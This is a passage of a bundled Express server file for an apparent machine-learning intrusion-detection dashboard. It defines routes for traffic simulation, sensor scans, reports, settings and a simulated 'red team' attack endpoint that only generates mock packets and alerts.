    actions,
    ruleRecommendation,
    metaLearningRecommendation: `Configure meta-learning MLOps support shots adapt parameters (recommend shots=5, LR=0.001) targeting target anomalous vector.`
  };
}
app.get("/api/simulation/status", (req, res) => {
  res.json({
    success: true,
    data: {
      isSimulating,
      activeScenario,
      packetRate: db2.settings.packetRate,
      blockedIpsCount: blockedIps.size
    }
  });
});
app.post("/api/simulation/control", authenticateToken, (req, res) => {
  const { action, scenario, packetRate } = req.body;
  if (action === "start") {
    isSimulating = true;
    addAudit(req.user.email, "Start Packet Simulation", "Simulation Core", req.ip || "127.0.0.1", "Success");
  } else if (action === "pause") {
    isSimulating = false;
    addAudit(req.user.email, "Pause Packet Simulation", "Simulation Core", req.ip || "127.0.0.1", "Success");
  }
  if (scenario) {
    activeScenario = scenario;
    addAudit(req.user.email, `Switch Simulation Scenario to ${scenario}`, "Simulation Core", req.ip || "127.0.0.1", "Success");
  }
  if (packetRate) {
    db2.settings.packetRate = packetRate;
    saveDatabase();
  }
  startSimulationLoop();
  res.json({
    success: true,
    data: {
      isSimulating,
      activeScenario,
      packetRate: db2.settings.packetRate
    }
  });
});
app.post("/api/simulation/custom-packet", authenticateToken, (req, res) => {
  const { sourceIp, destIp, protocol, sourcePort, destPort, payload, classification } = req.body;
  const forcedPacket = generateSimulatedPacket(classification);
  if (sourceIp) forcedPacket.sourceIp = sourceIp;
  if (destIp) forcedPacket.destIp = destIp;
  if (protocol) forcedPacket.protocol = protocol;
  if (sourcePort) forcedPacket.sourcePort = Number(sourcePort);
  if (destPort) forcedPacket.destPort = Number(destPort);
  if (payload) forcedPacket.payload = payload;
  db2.packets.unshift(forcedPacket);
  if (db2.packets.length > db2.settings.retention) db2.packets.pop();
  addAudit(req.user.email, "Inject Custom Packet Sandbox", "Sandbox Lab", req.ip || "127.0.0.1", "Success");
  saveDatabase();
  res.json({ success: true, data: forcedPacket });
});
app.get("/api/system/health", (req, res) => {
  const realHost = getRealSystemHealth();
  res.json({
    success: true,
    data: {
      frontend: "Operational",
      backend: "Operational",
      api: "Operational",
      database: isMongoConnected() ? "MongoDB Atlas (Connected)" : "Local File Store (Active)",
      aiService: process.env.GEMINI_API_KEY ? "Operational" : "Active (Local Offline Heuristics)",
      simulationEngine: isSimulating ? "Simulation Core Running" : "Live Host Packet Sniffer Active",
      latency: 4,
      // real local latency in ms
      requestCount: db2.packets.length,
      uptime: realHost.uptimeSeconds,
      hostInfo: realHost
    }
  });
});
app.get("/api/database/status", async (req, res) => {
  try {
    const stats = await getMongoStats();
    res.json({ success: true, data: stats });
  } catch (err) {
    res.status(500).json({ success: false, error: { message: err.message } });
  }
});
app.get("/api/system/settings", (req, res) => {
  res.json({ success: true, data: db2.settings });
});
app.post("/api/system/settings", authenticateToken, (req, res) => {
  db2.settings = { ...db2.settings, ...req.body };
  addAudit(req.user.email, "Update System Configurations", "System Settings", req.ip || "127.0.0.1", "Success");
  saveDatabase();
  persistSettingsToMongo(db2.settings);
  res.json({ success: true, data: db2.settings });
});
app.get("/api/system/logs", authenticateToken, (req, res) => {
  res.json({ success: true, data: db2.auditLogs });
});
app.post("/api/reports/generate", authenticateToken, (req, res) => {
  const { type } = req.body;
  const total = db2.packets.length;
  const critical = db2.alerts.filter((a) => a.severity === "Critical").length;
  const high = db2.alerts.filter((a) => a.severity === "High").length;
  const report = {
    id: `rep-${Date.now()}`,
    title: `${type || "Daily Security"} Diagnostic Report`,
    createdDate: (/* @__PURE__ */ new Date()).toISOString(),
    generatedBy: req.user.name,
    kpis: {
      packetsAnalyzed: total,
      threatsDetected: db2.alerts.length,
      criticalEvents: critical,
      defenseStatus: db2.settings.autoBlocking ? "Active IPS Blocking" : "Passive Alerting"
    },
    threatDistribution: db2.threats.map((t) => ({
      name: t.name,
      severity: t.severity,
      status: t.detectionStatus
    })),
    incidentsResolved: db2.incidents.filter((i) => i.status === "Resolved" || i.status === "Closed").length,
    activeBlockedIps: Array.from(blockedIps)
  };
  addAudit(req.user.email, `Generate Report (${type})`, "Reports Console", req.ip || "127.0.0.1", "Success");
  res.json({ success: true, data: report });
});
app.get("/api/sensors/scan", (req, res) => {
  const disks = scanRealDisks();
  const ports = scanRealPorts();
  const usbDevices = scanRealUsbDevices();
  const diskScore = disks.filter((d) => d.suspicious).length * 15;
  const portScore = ports.filter((p) => p.risk === "Critical").length * 25 + ports.filter((p) => p.risk === "Suspicious").length * 10;
  const usbScore = usbDevices.filter((u) => u.status !== "Trusted").length * 20;
  const bfScore = Array.from(bruteForceEvents.values()).filter((b) => b.status === "Active").length * 30;
  const threatScore = Math.min(100, diskScore + portScore + usbScore + bfScore);
  res.json({
    success: true,
    data: {
      disks,
      ports,
      usbDevices,
      bruteForce: Array.from(bruteForceEvents.values()),
      lastScanned: (/* @__PURE__ */ new Date()).toISOString(),
      threatScore,
      hostInfo: getRealSystemHealth()
    }
  });
});
app.post("/api/sensors/usb/block", authenticateToken, (req, res) => {
  const { deviceId } = req.body;
  blockRealUsb(deviceId);
  addAudit(req.user.email, `Block USB Peripheral ${deviceId}`, "Hardware Sensor", req.ip || "127.0.0.1", "Success");
  broadcastSse({
    type: "alert",
    alert: {
      id: `alert-usb-block-${Date.now()}`,
      packetId: `pkt-usb-${Date.now()}`,
      timestamp: (/* @__PURE__ */ new Date()).toISOString(),
      severity: "High",
      sourceIp: "127.0.0.1",
      destIp: "10.0.1.1",
      attackType: "Suspicious USB Device Blocked",
      engine: "Classical IDS",
      confidence: 95,
      status: "New"
    }
  });
  res.json({ success: true, message: `Device ${deviceId} blocked.` });
});
app.post("/api/sensors/bruteforce/resolve", authenticateToken, (req, res) => {
  const { eventId } = req.body;
  const evt = bruteForceEvents.get(eventId);
  if (evt) {
    evt.status = "Resolved";
    evt.blocked = false;
    blockedIps.delete(evt.sourceIp);
    addAudit(req.user.email, `Resolve Brute Force Event ${eventId}`, "Brute Force Sensor", req.ip || "127.0.0.1", "Success");
    bruteForceEvents.set(eventId, evt);
    return res.json({ success: true, data: evt });
  }
  res.status(404).json({ success: false, error: { message: "Brute force event not found." } });
});
app.get("/api/hacker/client-info", (req, res) => {
  const clientIp = (req.ip || req.socket.remoteAddress || "127.0.0.1").replace("::ffff:", "");
  const realHost = getRealSystemHealth();
  const serverLanIp = realHost.networkInterfaces[0]?.address || "127.0.0.1";
  res.json({
    success: true,
    data: {
      clientIp,
      serverIp: serverLanIp,
      serverPort: 3e3,
      isBlocked: blockedIps.has(clientIp),
      activeBlockedCount: blockedIps.size
    }
  });
});
app.post("/api/hacker/attack", (req, res) => {
  const { attackType, targetIp, targetPort, payload, sourceIp, profileId } = req.body;
  if (!attackType || !targetIp) {
    return res.status(400).json({ success: false, error: { message: "Missing attack parameters." } });
  }
  const clientIp = (req.ip || req.socket.remoteAddress || "127.0.0.1").replace("::ffff:", "");
  const effectiveSourceIp = sourceIp && sourceIp !== "real_device" && sourceIp !== "auto" ? sourceIp : clientIp;
  const classificationMap = {
    brute_force: "SQL Injection",
    // reuse engine for brute force login
    sql_injection: "SQL Injection",
    port_scan: "Port Scan",
    syn_flood: "SYN Flood",
    zero_day: "Zero-Day Alpha",
    usb_drop: "Zero-Day Beta"
  };
  const classification = classificationMap[attackType] || "Benign";
  const forged = generateSimulatedPacket(classification);
  forged.sourceIp = effectiveSourceIp;
  if (targetIp) forged.destIp = targetIp;
  if (targetPort) forged.destPort = Number(targetPort);
  if (payload) forged.payload = payload;
  db2.packets.unshift(forged);
  if (db2.packets.length > db2.settings.retention) db2.packets.pop();
  if (attackType === "brute_force") {
    const bfKey = `${sourceIp}:target_system`;
    const existing = failedLoginAttempts.get(bfKey) || { count: 0, lastAttempt: "", user: "admin@aegis.io" };
    existing.count += Math.floor(Math.random() * 3) + 1;
    existing.lastAttempt = (/* @__PURE__ */ new Date()).toISOString();
    failedLoginAttempts.set(bfKey, existing);
    if (existing.count >= 5) {
      const bfId = `bf-${Buffer.from(bfKey).toString("hex").substring(0, 8)}`;
      bruteForceEvents.set(bfId, {
        id: bfId,
        sourceIp: sourceIp || "0.0.0.0",
        targetUser: "admin@aegis.io",
        attempts: existing.count,
        lastAttempt: existing.lastAttempt,
        blocked: true,
        status: "Active"
      });
      blockedIps.add(sourceIp || "0.0.0.0");
    }
  }
  const detected = forged.classicalIds.detected || forged.metaIds.detected;
  const blocked = detected && db2.settings.autoBlocking;
  const confidence = Math.max(forged.classicalIds.confidence, forged.metaIds.confidence);
  if (detected) {
    const alert = {
      id: `alert-redteam-${Date.now()}`,
      packetId: forged.id,
      timestamp: forged.timestamp,
      severity: forged.severity,
      sourceIp: forged.sourceIp,
      destIp: forged.destIp,
      attackType: `[Red Team] ${classification}`,
      engine: forged.classicalIds.detected && forged.metaIds.detected ? "Dual Engine" : forged.metaIds.detected ? "Meta-Learning IDS" : "Classical IDS",
      confidence,
      status: "New"
    };
    db2.alerts.unshift(alert);
    if (db2.alerts.length > 500) db2.alerts.pop();
    totalAlertsGenerated++;
    persistAlertToMongo(alert);
    broadcastSse({ type: "alert", alert, packet: forged });
  }
  broadcastSse({
    type: "packet",
    packet: forged,
    stats: {
      totalPackets: ++totalPacketsGenerated,
      totalAlerts: totalAlertsGenerated,
      activeScenario,
      blockedIpsCount: blockedIps.size
    }
  });
  saveDatabase();
  persistPacketToMongo(forged);
  const responseMessages = {
    brute_force: detected ? "Login attempt rate-limited and flagged by AEGIS" : "Login attempt recorded \u2014 under threshold",
    sql_injection: detected ? "SQLi payload matched signature rule-sqli and blocked" : "Query executed without detection",
    port_scan: detected ? "Scan sweep pattern flagged by VLAN monitor rule" : "Ports enumerated without detection",
    syn_flood: detected ? "SYN flood rate threshold breached \u2014 gateway defended" : "SYN packets sent without detection",
    zero_day: detected ? "Anomalous cluster detected by meta-learning engine" : "Deserialization payload bypassed classical rules",
    usb_drop: detected ? "DNS tunnel exfil pattern flagged by meta-learning" : "Data exfiltration attempt undetected"
  };
  res.json({
    success: true,
    data: {
      packetId: forged.id,
      detected,
      blocked,
      confidence,
      status: blocked ? "Blocked" : detected ? "Detected" : "Evaded",
      responseMsg: responseMessages[attackType] || "Attack processed."
    }
  });
});
app.post("/api/hacker/usb-insert", (req, res) => {
  const { deviceName, vendor, serial } = req.body;
  const suspicious = (serial || "").includes("ROGUE") || (serial || "").includes("0x");
  const newDevice = {
    id: `usb-${Date.now()}`,
    name: deviceName || "Unknown USB Device",
    vendor: vendor || "Unknown Vendor",
    serial: serial || "N/A",
    connectedAt: (/* @__PURE__ */ new Date()).toISOString(),
    status: suspicious ? "Suspicious" : "Trusted",
    reason: suspicious ? "Serial number pattern matches known rogue device signatures" : void 0
  };
  usbDeviceList.unshift(newDevice);
  if (usbDeviceList.length > 20) usbDeviceList.pop();
  if (suspicious) {
    broadcastSse({
      type: "alert",
      alert: {
        id: `alert-usb-${Date.now()}`,
        packetId: `pkt-usb-${Date.now()}`,
        timestamp: (/* @__PURE__ */ new Date()).toISOString(),
        severity: "High",
        sourceIp: "127.0.0.1",
        destIp: "10.0.1.1",
        attackType: "Suspicious USB Device Inserted",
        engine: "Classical IDS",
        confidence: 88,
        status: "New"
      }
    });
  }
  res.json({
    success: true,
    data: {
      device: newDevice,
      detected: suspicious,
      status: newDevice.status
    }
  });
});
usbDeviceList.push({
  id: "usb-seed-1",
  name: "Kingston DataTraveler 64GB",
  vendor: "Kingston Technology",
  serial: "KT-DT-0082FABB",
  connectedAt: new Date(Date.now() - 36e5).toISOString(),
  status: "Trusted"
});
bruteForceEvents.set("bf-demo-1", {
  id: "bf-demo-1",
  sourceIp: "198.51.100.22",
  targetUser: "admin@aegis.io",
  attempts: 127,
  lastAttempt: new Date(Date.now() - 12e4).toISOString(),
  blocked: true,
  status: "Active"
});
blockedIps.add("198.51.100.22");
app.get("/api/live-stream", (req, res) => {
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.flushHeaders();
  sseClients.add(res);
  req.on("close", () => {
    sseClients.delete(res);
  });
});
async function bootstrap() {
  try {
    await connectMongo();
    const mongoState = await syncMongoInitialData({
      users: db2.users,
      packets: db2.packets,
      alerts: db2.alerts,
      incidents: db2.incidents,
      threats: db2.threats,
      rules: db2.rules,
      models: db2.models,
      settings: db2.settings
    });
    if (mongoState) {
      if (mongoState.users.length > 0) db2.users = mongoState.users;
      if (mongoState.rules.length > 0) db2.rules = mongoState.rules;
      if (mongoState.threats.length > 0) db2.threats = mongoState.threats;
      if (mongoState.models.length > 0) db2.models = mongoState.models;
      if (mongoState.incidents.length > 0) db2.incidents = mongoState.incidents;
      if (mongoState.packets.length > 0) db2.packets = mongoState.packets;
      if (mongoState.alerts.length > 0) db2.alerts = mongoState.alerts;
      if (mongoState.auditLogs.length > 0) db2.auditLogs = mongoState.auditLogs;
      if (mongoState.settings) db2.settings = { ...db2.settings, ...mongoState.settings };
      console.log("[Bootstrap] In-memory state hydrated from MongoDB Atlas.");
      saveDatabase();
    }
  } catch (err) {
    console.warn("[Bootstrap] MongoDB Atlas unavailable. Running with local file store.", err.message);
  }
  if (process.env.NODE_ENV === "production" || fs2.existsSync(path.resolve(process.cwd(), "dist"))) {
    app.use(express.static(path.resolve(process.cwd(), "dist")));
    app.get("*", (req, res) => {
      res.sendFile(path.resolve(process.cwd(), "dist", "index.html"));
    });
  } else {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "custom"
    });
    app.use(vite.middlewares);
    app.use("*", async (req, res, next) => {
      const url = req.originalUrl;
      try {
        let template = fs2.readFileSync(path.resolve(process.cwd(), "index.html"), "utf-8");
        template = await vite.transformIndexHtml(url, template);
        res.status(200).set({ "Content-Type": "text/html" }).end(template);
      } catch (e) {
        vite.ssrFixStacktrace(e);
        next(e);
      }
    });
  }
  const port = process.env.PORT || 3e3;
  app.listen(port, () => {
    console.log(`AEGIS ML IDS system running on http://0.0.0.0:${port}`);
    console.log(`MongoDB Atlas: ${isMongoConnected() ? "Connected \u2713" : "Offline \u2014 using local store"}`);
  });
}
bootstrap();
